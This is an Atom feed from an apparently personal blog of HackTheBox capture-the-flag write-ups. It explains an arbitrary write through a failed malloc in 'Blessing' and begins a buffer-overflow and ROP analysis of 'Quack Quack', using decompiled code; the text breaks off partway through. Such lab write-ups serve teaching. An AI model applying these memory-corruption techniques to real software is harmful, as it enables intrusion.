@@ -1,0 +1,818 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://0.0.0.0:4000/ctf-vault/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/ctf-vault/" rel="alternate" type="text/html" hreflang="en" /><updated>2025-06-24T08:38:49+05:30</updated><id>http://0.0.0.0:4000/ctf-vault/feed.xml</id><title type="html">CTF Vault</title><subtitle>Writeups of challenges from various platforms.
+</subtitle><author><name>Mehul Singh</name></author><entry><title type="html">Blessing - HackTheBox Challenge Writeup</title><link href="http://0.0.0.0:4000/ctf-vault/blessing.htb" rel="alternate" type="text/html" title="Blessing - HackTheBox Challenge Writeup" /><published>2025-06-07T00:00:00+05:30</published><updated>2025-06-07T00:00:00+05:30</updated><id>http://0.0.0.0:4000/ctf-vault/blessing.htb</id><content type="html" xml:base="http://0.0.0.0:4000/ctf-vault/blessing.htb"><![CDATA[<h1 id="overview">Overview</h1>
+
+<p>Today we will work on <a href="https://app.hackthebox.com/challenges/Blessing">HackTheBox</a>’s “Blessing” challenge. It’s a very easy challenge if we are only looking to exploit, but we can find a bit more unintended information about the actual code and the complete range of inputs possible to exploit if we are curious, post exploitation. This challenge focused on exploiting <strong>malloc()</strong> by abusing <strong>pointer arithmetic</strong> and how <strong>mmap()</strong> function works. So let’s begin!</p>
+
+<h1 id="fuzzing">Fuzzing</h1>
+
+<p>As usual, let’s simply run the application and see what we are given on the front-end.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>In the ancient realm of Eldoria, a roaming bard grants you good luck and offers you a gift!
+
+Please accept this:
+
+<span class="o">[</span>Bard]: Now, I want something <span class="k">in return</span>...
+
+How about a song?
+
+Give me the song<span class="s1">'s length: 2
+
+[Bard]: Excellent! Now tell me the song: A
+A
+[Bard]: Your song was not as good as expected...
+</span></code></pre></div></div>
+
+<p>So it expects a number as length and asks for a “song”, and entering a humongous length causes a segmentation fault”. Apart from that, we are given a big hex value at “Please accept this: “ which looked like a memory pointer. So let’s analyze it further with ghidra.</p>
+
+<h1 id="ananlysis">Ananlysis</h1>
+
+<h2 id="ghidra-disassembly">Ghidra Disassembly</h2>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+  <span class="kt">size_t</span> <span class="n">local_30</span><span class="p">;</span>
+  <span class="n">ulong</span> <span class="n">local_28</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="o">*</span><span class="n">local_20</span><span class="p">;</span>
+  <span class="kt">void</span> <span class="o">*</span><span class="n">local_18</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
+  
+  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+  <span class="n">setup</span><span class="p">();</span>
+  <span class="n">banner</span><span class="p">();</span>
+  <span class="n">local_30</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">local_20</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x30000</span><span class="p">);</span>
+  <span class="o">*</span><span class="n">local_20</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="n">printstr</span><span class="p">(</span><span class="s">"In the ancient realm of Eldoria, a roaming bard grants you good luck and offers you a gif t!</span><span class="se">\n\n</span><span class="s">Please accept this: "</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"%p"</span><span class="p">,</span><span class="n">local_20</span><span class="p">);</span>
+  <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+  <span class="k">for</span> <span class="p">(</span><span class="n">local_28</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">local_28</span> <span class="o">&lt;</span> <span class="mh">0xe</span><span class="p">;</span> <span class="n">local_28</span> <span class="o">=</span> <span class="n">local_28</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\b</span><span class="s"> </span><span class="se">\b</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">usleep</span><span class="p">(</span><span class="mi">60000</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"%s[%sBard%s]: Now, I want something in return...</span><span class="se">\n\n</span><span class="s">How about a song?</span><span class="se">\n\n</span><span class="s">Give me the song\ 's length: "</span>
+         <span class="p">,</span><span class="o">&amp;</span><span class="n">DAT_00102063</span><span class="p">,</span><span class="o">&amp;</span><span class="n">DAT_00102643</span><span class="p">,</span><span class="o">&amp;</span><span class="n">DAT_00102063</span><span class="p">);</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_001026b1</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_30</span><span class="p">);</span>
+  <span class="n">local_18</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">local_30</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">%s[%sBard%s]: Excellent! Now tell me the song: "</span><span class="p">,</span><span class="o">&amp;</span><span class="n">DAT_00102063</span><span class="p">,</span><span class="o">&amp;</span><span class="n">DAT_00102643</span><span class="p">,</span>
+         <span class="o">&amp;</span><span class="n">DAT_00102063</span><span class="p">);</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">local_18</span><span class="p">,</span><span class="n">local_30</span><span class="p">);</span>
+  <span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">local_18</span> <span class="o">+</span> <span class="p">(</span><span class="n">local_30</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">local_18</span><span class="p">,</span><span class="n">local_30</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">local_20</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">read_flag</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">%s[%sBard%s]: Your song was not as good as expected...</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">DAT_001026e9</span><span class="p">,</span>
+           <span class="o">&amp;</span><span class="n">DAT_00102643</span><span class="p">,</span><span class="o">&amp;</span><span class="n">DAT_001026e9</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+    <span class="n">__stack_chk_fail</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>This code confirms the fact that we were given a memory pointer stored in <code class="language-plaintext highlighter-rouge">local_20</code>. So the flow of code is as follows:</p>
+<ol>
+  <li>Allocate around 196KB of memory and store its pointer in <code class="language-plaintext highlighter-rouge">local_20</code>.</li>
+  <li>Set the initialized memory to <code class="language-plaintext highlighter-rouge">1</code>.</li>
+  <li>Ask the user for a <code class="language-plaintext highlighter-rouge">long unsigned integer</code> in <code class="language-plaintext highlighter-rouge">local_30</code> and allocate a new space of memory with that size, with the new location pointer stored in <code class="language-plaintext highlighter-rouge">local_18</code>.</li>
+  <li>Perform pointer arithmetic on the created memory and initialize the new calculated memory location with <code class="language-plaintext highlighter-rouge">0</code>.</li>
+  <li>Check if our initial memory location <code class="language-plaintext highlighter-rouge">local_20</code> contains 0 or not. If it does, provide the flag, otherwise exit normally.</li>
+</ol>
+
+<p>So we have to find a way to change the <code class="language-plaintext highlighter-rouge">*local_20</code> value to <code class="language-plaintext highlighter-rouge">0</code></p>
+
+<h1 id="exploit">Exploit</h1>
+
+<h2 id="theory">Theory</h2>
+
+<p>Just before the <code class="language-plaintext highlighter-rouge">if</code> statement we have an interesting line of code:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">local_18</span> <span class="o">+</span> <span class="p">(</span><span class="n">local_30</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>This line is performing arithmetic on some values and dereferencing it to store <code class="language-plaintext highlighter-rouge">0</code> at the pointer result. Is there a way we can control the values to store this <code class="language-plaintext highlighter-rouge">0</code> at <code class="language-plaintext highlighter-rouge">*local_20</code>? Because remember, we are given the location of this malloc’d memory, and we can try to match the LHS to this address. So here’s what we know and controls regarding the variables:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">size_t</span> <span class="n">local_30</span><span class="p">;</span>
+<span class="kt">void</span> <span class="o">*</span><span class="n">local_18</span><span class="p">;</span>
+<span class="n">local_30</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_001026b1</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_30</span><span class="p">);</span>
+<span class="n">local_18</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">local_30</span><span class="p">);</span>
+<span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">local_18</span> <span class="o">+</span> <span class="p">(</span><span class="n">local_30</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p><a href="https://en.cppreference.com/w/c/types/size_t.html">size_t</a> is a <strong>platform-dependant</strong> integer type that can store upto 8 bytes of unsigned integer (upto 18 quintillion). It is initialized to <code class="language-plaintext highlighter-rouge">0</code> and we enter a value into this variable <code class="language-plaintext highlighter-rouge">local_30</code> when providing the “song length”. It uses the value to allocate that amount of storage to <code class="language-plaintext highlighter-rouge">local_18</code>. The key to exploit the arithmetic is to understand that if we supply a very big value as “song length” in <code class="language-plaintext highlighter-rouge">local_30</code>, <code class="language-plaintext highlighter-rouge">malloc(local_30)</code> will fail and return <code class="keyword">NULL</code> and <code class="language-plaintext highlighter-rouge">0x0</code> will be stored in <code class="language-plaintext highlighter-rouge">local_18</code>. Thus the equation will reduce to:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*(undefined8 *)((local_30 - 1)) = 0;
+</code></pre></div></div>
+
+<p>And if we enter 1 + the address in <code class="language-plaintext highlighter-rouge">local_20</code> as “song length” to <code class="language-plaintext highlighter-rouge">local_30</code>, which is provided to us briefly and which stores the value 1, the equation will finally become:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*(undefined8 *)(local_20)) = 0;
+</code></pre></div></div>
+
+<p>And this should inadvertently change <code class="language-plaintext highlighter-rouge">*local_20</code> to 0, giving us the flag!</p>
+
+<h2 id="testing-exploit">Testing exploit</h2>
+
+<p>We can test directly in GDB and put a breakpoint right after it provides the address. Then we can convert the address to decimal and add 1, and provide that as the song length.</p>
+
+<div style="margin:0 auto;" align="center">
+  <p><img src="/ctf-vault/assets/images/articles/blessing-run.png" alt="Image" class="rounded" /></p>
+</div>
+
+<p>And with this we exploited the binary to provide us the flag!</p>
+
+<h1 id="beyond-the-flag">Beyond the Flag</h1>
+
+<p>Beyond the exploit, there were a couple of things of interest for me.</p>
+
+<h2 id="mmap">MMAP()</h2>
+
+<p>What we took for granted was the fact that the malloc’d address we were given at the beginning was a very high memory address. And it was only due to this high address, that the second <code class="language-plaintext highlighter-rouge">malloc()</code> failed and returned <code class="keyword">NULL</code>. This was due to the fact that when we request a small amount of space through <code class="language-plaintext highlighter-rouge">malloc()</code> (generally, anything less than 128KB), malloc utilizes <a href="https://man7.org/linux/man-pages/man2/brk.2.html">brk()</a> to provide memory space from heap, placed lower in memory. But when requesting more than that, it uses <a href="https://pubs.opengroup.org/onlinepubs/9699919799/functions/mmap.html">mmap()</a> to request the memory space from an anonymous mapped memory space, which is always placed higher in memory.</p>
+
+<p>So even though we did not require <code class="language-plaintext highlighter-rouge">0x3000</code> bytes of data to store the “song length”, if the code used a smaller size, heap would’ve been utilized and returned a lower address, making our further attack impossible.</p>
+
+<h2 id="other-solutions">Other Solution(s)?</h2>
+
+<p>Are there other solutions apart from <code class="language-plaintext highlighter-rouge">local_20 + 1</code>? Yes! So if we focus again on the pointer arithmetic, assuming a large “song length” for <code class="language-plaintext highlighter-rouge">local_18</code> to be <code class="keyword">NULL</code> again:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">local_30</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Based on the size of the <code class="language-plaintext highlighter-rouge">undefined8</code> data type, the range of valid inputs changes, since the write operation spans multiple bytes. For example, if the type were 2 bytes (like short), the write would only affect [x, x+1], but with an 8-byte type (like long), it could span [x-6, x+1] due to how pointer arithmetic works.</p>
+
+<p>In this case upon checking manually:</p>
+
+\[local\_30 \in [local\_20 - 6, local\_20+1] \cap \mathbb{R}\]
+
+<p>And since the range of possible entries is 8 bytes, we can come to the conclusion that the <code class="language-plaintext highlighter-rouge">undefined8</code> is of <code class="language-plaintext highlighter-rouge">long</code> integer data type for a 64-bit system! You can refer the below image to visualize what is happening.</p>
+
+<div style="margin:0 auto;" align="center">
+  <p><img src="/ctf-vault/assets/images/articles/blessing-memmap.png" alt="Image" class="rounded" /></p>
+</div>
+
+<p>This just further helps us understand the actual code and the complete possibilities of inputs we could use to exploit the vulnerability.</p>]]></content><author><name>Mehul Singh</name></author><category term="arbitrary write" /><category term="binary exploitation" /><category term="debugging" /><category term="exploit development" /><category term="gdb" /><category term="ghidra" /><category term="htb" /><category term="malloc" /><category term="mmap" /><category term="pointer arithmetic" /><category term="pwn" /><summary type="html"><![CDATA[Solving an easy challenge on HackTheBox platform.]]></summary></entry><entry><title type="html">Quack Quack - HackTheBox Challenge Writeup</title><link href="http://0.0.0.0:4000/ctf-vault/quack-quack.htb" rel="alternate" type="text/html" title="Quack Quack - HackTheBox Challenge Writeup" /><published>2025-06-02T00:00:00+05:30</published><updated>2025-06-02T00:00:00+05:30</updated><id>http://0.0.0.0:4000/ctf-vault/quack-quack.htb</id><content type="html" xml:base="http://0.0.0.0:4000/ctf-vault/quack-quack.htb"><![CDATA[<h1 id="overview">Overview</h1>
+
+<p>Today we will work on <a href="https://app.hackthebox.com/challenges/Quack%20Quack">HackTheBox</a>’s “Quack Quack” challenge. It’s a very easy challenge focusing on <strong>buffer overflow</strong> due to improper coding and abusing <strong>ROP (Return-Oriented Programming)</strong>. So let’s begin!</p>
+
+<h1 id="fuzzing">Fuzzing</h1>
+
+<p>As usual, let’s simply run the application and see what we are given on the front-end.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Quack the Duck!
+
+<span class="o">&gt;</span> <span class="nb">test</span>
+
+<span class="o">[</span>-] Where are your Quack Manners?!
+</code></pre></div></div>
+<p>An application which expects some specific input to give us what we want. From this the only thing I could find was the input size to be limited to 102 bytes. Next, let’s analyze the binary itself.</p>
+
+<h1 id="initial-analysis">Initial Analysis</h1>
+
+<p>We are provided with a non-portable binary named “quack_quack” having the following properties:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>file quack_quack
+quack_quack: ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2,
+BuildID[sha1]<span class="o">=</span>225daf82164eadc6e19bee1cd1965754eefed6aa, <span class="k">for </span>GNU/Linux 3.2.0, not stripped
+<span class="nv">$ </span>checksec <span class="nt">--file</span><span class="o">=</span>quack_quack
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
+Full RELRO      Canary found      NX enabled    No PIE          No RPATH   RW-RUNPATH   54 Symbols        No    0               2               quack_quack
+</code></pre></div></div>
+
+<p>It doesn’t have PIE enabled, but rest of the protections are. Let’s now analyze the code with Ghidra.</p>
+
+<h2 id="ghidra-analysis">Ghidra Analysis</h2>
+
+<p>Before jumping straight into the main() function, we do see some interesting functions namely duck_attack() and duckling().</p>
+
+<div style="margin:0 auto;" align="center">
+  <p><img src="/ctf-vault/assets/images/articles/quack-functions.png" alt="Image" class="rounded" /></p>
+</div>
+
+<p>If we don’t find anything interesting we will come back to these, but for now let’s jump to main().</p>
+
+<h3 id="dissecting-main">Dissecting main()</h3>
+
+<p>Unfortunately we don’t find much in the main() function.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">long</span> <span class="n">lVar1</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+
+  <span class="n">lVar1</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+  <span class="n">duckling</span><span class="p">();</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">lVar1</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+    <span class="n">__stack_chk_fail</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The only thing of interest is that it has <strong>stack canary protection</strong> enabled because of <code class="language-plaintext highlighter-rouge">lVar1 = *(long *)(in_FS_OFFSET + 0x28);</code> and <code class="language-plaintext highlighter-rouge">if (lVar1 != *(long *)(in_FS_OFFSET + 0x28))</code>, which we already confirmed with <code class="language-plaintext highlighter-rouge">checksec</code> command. But apart from that, main() is only calling the function duckling(). So let’s jump to that.</p>
+
+<h3 id="dissesting-duckling">Dissesting duckling()</h3>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">duckling</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">pcVar1</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">input</span> <span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+  <span class="n">undefined8</span> <span class="n">local_68</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_60</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_58</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_50</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_48</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_40</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_38</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_30</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_28</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_20</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
+
+  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+  <span class="n">input</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
+  <span class="n">input</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
+  <span class="n">input</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
+  <span class="p">...</span>
+  <span class="n">input</span><span class="p">[</span><span class="mh">0x1d</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
+  <span class="n">input</span><span class="p">[</span><span class="mh">0x1e</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
+  <span class="n">input</span><span class="p">[</span><span class="mh">0x1f</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
+  <span class="n">local_68</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">local_60</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">local_58</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">local_50</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">local_48</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">local_40</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">local_38</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">local_30</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">local_28</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">local_20</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Quack the Duck!</span><span class="se">\n\n</span><span class="s">&gt; "</span><span class="p">);</span>
+  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">input</span><span class="p">,</span><span class="mh">0x66</span><span class="p">);</span>
+  <span class="n">pcVar1</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">input</span><span class="p">,</span><span class="s">"Quack Quack "</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">pcVar1</span> <span class="o">==</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">error</span><span class="p">(</span><span class="s">"Where are your Quack Manners?!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mh">0x520</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Quack Quack %s, ready to fight the Duck?</span><span class="se">\n\n</span><span class="s">&gt; "</span><span class="p">,</span><span class="n">pcVar1</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">);</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_68</span><span class="p">,</span><span class="mh">0x6a</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Did you really expect to win a fight against a Duck?!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+    <span class="n">__stack_chk_fail</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>This function initially defines a lot of variables, then assigns the <code class="language-plaintext highlighter-rouge">input</code> list with <code class="language-plaintext highlighter-rouge">\0</code>s and the integers with <code class="language-plaintext highlighter-rouge">0</code>s. And after printing, it reads <code class="language-plaintext highlighter-rouge">stdin</code> into the <code class="language-plaintext highlighter-rouge">input</code> list and finds a specific substring through <code class="language-plaintext highlighter-rouge">strstr()</code>, which then later exits the application if not found. Otherwise it later reads <code class="language-plaintext highlighter-rouge">stdin</code> again and stores the input at the address of <code class="language-plaintext highlighter-rouge">local_68</code>. The function at last prints a string before exiting.</p>
+
+<h3 id="checking-duck_attack">Checking duck_attack()</h3>
+
+<p>Remember we came across <code class="language-plaintext highlighter-rouge">duck_attack()</code> function earlier? Upon loading it, we find that this function is the one that opens the flag and prints the file. Okay so from this we can assume we have to somehow execute this function.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">duck_attack</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">ssize_t</span> <span class="n">sVar1</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">local_15</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">local_14</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
+
+  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+  <span class="n">local_14</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"./flag.txt"</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">local_14</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">perror</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Error opening flag.txt, please contact an Administrator</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
+    <span class="n">sVar1</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">local_14</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_15</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">sVar1</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+    <span class="n">fputc</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">local_15</span><span class="p">,</span><span class="n">stdout</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">close</span><span class="p">(</span><span class="n">local_14</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+    <span class="n">__stack_chk_fail</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Let’s run and debug the application with GDB</p>
+
+<h2 id="post-analysis-notes">Post Analysis Notes</h2>
+
+<p>There are few issues and takeaways with the above code:</p>
+<ol>
+  <li>The <a href="#first-read">first read()</a> function is reading 102 bytes into <code class="language-plaintext highlighter-rouge">input</code> but the variable is only assigned to use 32 bytes. This is why we were able to enter 102 bytes during our <a href="#fuzzing">Fuzzing</a></li>
